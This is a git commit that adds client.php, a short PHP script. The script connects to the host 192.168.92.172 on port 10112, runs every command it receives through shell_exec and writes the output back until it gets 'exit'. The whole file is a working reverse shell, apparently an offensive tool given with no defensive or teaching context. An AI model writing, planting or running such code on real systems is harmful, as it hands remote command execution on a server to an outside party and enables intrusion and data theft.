769a3142d9be5160d654b0d277404de1f8dc15a9
cyber communinty <74042135+ankit637@users.noreply.github.com>
2023-10-03 12:58:04 +0530

    client.php

---
+++ client.php
@@ -0,0 +1,19 @@
+<?php
+$host = '192.168.92.172';
+$port = 10112;
+
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_connect($socket, $host, $port);
+
+while (true) {
+    $command = socket_read($socket, 1024);
+    if (strtolower($command) == 'exit') {
+        break;
+    }
+
+    $output = shell_exec($command);
+    socket_write($socket, $output, strlen($output));
+}
+
+socket_close($socket);
+?>
